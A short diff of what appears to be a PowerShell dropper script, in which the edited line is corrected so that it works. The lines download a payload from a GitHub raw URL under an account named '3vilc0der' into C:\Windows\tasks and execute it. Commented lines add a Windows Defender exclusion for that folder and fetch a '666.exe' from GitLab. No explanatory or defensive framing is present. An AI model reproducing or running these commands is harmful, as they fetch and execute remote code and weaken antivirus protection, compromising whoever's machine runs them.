@@ -1,4 +1,4 @@
 //Set-MpPreference -ExclusionPath "C:\Windows\tasks\"
 //iwr -uri https://gitlab.com/13373v1l/666/-/raw/main/666.exe -O "C:\Windows\tasks\666.exe"
-iwr -uri https://raw.githubusercontent.com/3vilc0der/afwefd237/main/666.txt -O "C:\Windows\tasks\666.txt";./666.txt
+iwr -uri https://raw.githubusercontent.com/3vilc0der/afwefd237/main/666.txt -O "C:\Windows\tasks\666.txt";.\666.txt
 
